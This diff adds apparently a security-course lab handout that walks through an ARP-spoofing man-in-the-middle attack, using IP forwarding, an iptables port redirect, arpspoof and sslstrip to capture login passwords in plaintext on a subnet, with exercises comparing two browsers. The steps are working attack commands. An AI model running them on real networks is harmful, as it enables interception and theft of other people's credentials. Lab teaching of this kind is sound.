@@ -1,0 +1,52 @@
+This lab exercise is to steal all the passwords in a subnet.
+
+1. Open Windows command prompt and determine Windows IP address using the command:
+•	ipconfig /all
+
+2. Open Kali Linux terminal#1
+
+3. Determine the default gateway and interface connected to Windows using the command:
+•	netstat -r
+
+3. Run the command:
+•	echo 1 > /proc/sys/net/ipv4/ip_forward to enable IP forwarding by writing the value 1 in the file specified path. To do MITM, the box should act like a router and be able to forward packets that does not have the IP address in it as the destination
+
+4. Set up iptables to redirect traffic from port 80 to port 10000 using the command:
+•	iptables -t nat -A PREROUTING -p tcp –-destination-port 80 -j REDIRECT –-to-port 10000
+◦	–t specifies a table such as nat, which is consulted when a packet that creates a new connection is encountered
+◦	–A to append one or more rules to the accepted chain. PREROUTING is one of the built-ins of the NAT table option. It is for altering packets as soon as they come in
+◦	–p specifies a protocol such as tcp
+◦	–destination-port such as 80
+◦	–j specifies an action such as REDIRECT to port 10000 as this is the port sslstrip listens on by default
+
+5. Send ARP replies to the Windows IP address:
+•	arpspoof -i <interface> -t <Windows IP address)> <default gateway> (Default gateway is the IP address we are “pretending” to be, essentially telling the target that we are the gateway)
+◦	-i specifies interface
+◦	-t specifies target (Arpspoof sends ARP replies to Windows IP address)
+
+6. Open Kali Linux terminal#2 and run command:
+•	sslstrip -k -l 10000 -w /root/Desktop/sslstrip1.log
+◦	-k to kill all sessions in progress (Forces target ssl session to restart and allows the tool to work on sessions already established)
+◦	-l as listening on port 10000
+◦	–w to write logs into /root/Desktop/sslstrip1.log file
+
+7. Open Kali Linux terminal#3 and run command:
+•	tail -f /root/Desktop/sslstrip1.log
+
+
+
+
+
+
+
+
+
+
+This project includes the following exercises:
+
+EXERCISE#1 In Windows, Open IE explorer, delete history files, login to an account (ie amazon, gmail, or etc) using a fake password to see the password in plaintext in sslstrip1.log and terminal. 
+
+EXERCISE#2. In Windows, Open Google Chrome, login to an account (ie facebook, gmail, or etc) using a fake password to see the password in plaintext in sslstrip1.log and terminal. 
+
+EXERCISE#3 What’s the difference between EXERCISE#1 results and EXERCISE#2 results, if any?
+
